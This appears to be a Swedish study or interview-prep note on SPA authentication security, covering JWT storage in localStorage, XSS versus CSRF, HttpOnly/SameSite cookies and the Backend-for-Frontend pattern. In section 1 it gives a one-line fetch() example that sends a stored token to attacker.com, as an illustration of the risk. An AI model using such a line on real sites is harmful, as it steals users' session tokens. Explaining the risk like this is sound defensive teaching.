# 🔐 03-auth-session-flow: BFF Pattern, HttpOnly Cookies & XSS vs CSRF

## 1. Problem: Vad kraschar eller varför bryr vi oss?
I moderna Single Page Applications (SPA) är det frestande att ta emot en JWT vid inloggning och spara den i `localStorage.setItem('access_token', token)`.

**Detta är en allvarlig säkerhetsrisk:**
* **XSS Exfiltration:** `localStorage` är fullt läsbart för all Javascript som körs i applikationen. Om ett tredjeparts npm-paket komprometteras (Supply Chain Attack) eller om en XSS-sårbarhet finns, kan angriparen exfiltrera användarens JWT med en enda rad kod:
  ```javascript
  fetch('https://attacker.com/steal?t=' + localStorage.getItem('access_token'));
  ```
* **Ingen Session Revocation:** Om en JWT har lång livslängd kan den inte enkelt återkallas om den hamnar i orätta händer.

---

## 2. Keyword Bingo (Facit-lingo)
* **XSS (Cross-Site Scripting):** Skadlig kod injiceras och exekveras i användarens webbläsarkontext.
* **CSRF (Cross-Site Request Forgery):** Angriparen lurar användarens webbläsare att skicka obehöriga förfrågningar med befintliga kakor.
* **`HttpOnly` Cookie Flag:** Förbjuder all åtkomst till kakan via Javascript (`document.cookie`). Eliminerar risken för stöld via XSS!
* **`SameSite=Lax` / `SameSite=Strict`:** Skyddar mot CSRF genom att förhindra att kakan skickas med i förfrågningar från externa domäner.
* **BFF Pattern (Backend-for-Frontend):** Ett lättviktigt server-lager (Node.js/Next.js/Spring Cloud Gateway) som agerar brygga mellan SPA och interna mikrotjänster. BFF:en tar emot HttpOnly cookies och injicerar `Authorization: Bearer <jwt>` mot interna API:er.
* **Token Rotation (Refresh Token Rotation):** Varje gång ett refresh-token används förbrukas det och ett nytt utfärdas. Om ett gammalt token används igen ogiltigförklaras hela sessionen direkt.

---

## 3. Verklighets-svar (30–60 sek)
> *"Att lagra JWT-tokens i `localStorage` är ett stort no-go i företagsmiljöer eftersom all Javascript har full åtkomst till det – en enda XSS-sårbarhet eller ett komprometterat npm-bibliotek kan exfiltrera alla användartokens. Den etablerade best-practice-arkitekturen är BFF-mönstret (Backend-for-Frontend). Klienten pratar enbart med en BFF via krypterade `HttpOnly`, `Secure` och `SameSite=Lax` session-cookies. Webbläsarens Javascript kan aldrig läsa tokenet. BFF:en tar emot cookien, validerar sessionen och injicerar det riktiga JWT Bearer-tokenet i anropen mot de interna mikrotjänsterna."*

---

## 4. Felsökningsguide (Kommandon & Verktyg)

### A. Inspektera Cookie-flaggor i DevTools
1. Öppna Chrome DevTools -> **Application** -> **Cookies**.
2. Verifiera följande kolumner:
   * **HttpOnly:** Måste ha en bockmarkering (skyddar mot JS-läsning).
   * **Secure:** Måste ha en bockmarkering (kräver HTTPS).
   * **SameSite:** Ska vara satt till `Lax` eller `Strict` (skyddar mot CSRF).

### B. Testa XSS i Console
Kör i utvecklarkonsolen:
```javascript
console.log(document.cookie);
// Om sessionskakan skrivs ut här saknas HttpOnly och är sårbar för XSS!
```

---

## 5. Koden & Verifiering

* **The Flaw:** [FlawedLocalStorageAuth.ts](file:///frontend/03-auth-session-flow/FlawedLocalStorageAuth.ts) – Lagrar hemliga tokens i `localStorage` tillgängligt för XSS.
* **The Fix:** [BffCookieAuth.ts](file:///frontend/03-auth-session-flow/BffCookieAuth.ts) – Sätter säkra HttpOnly-cookies och isolerar tokens till servern.
* **Verification Test:** [AuthSecurity.test.ts](file:///frontend/03-auth-session-flow/AuthSecurity.test.ts) – Simulerar angreppsvektor mot localStorage vs HttpOnly skydd.
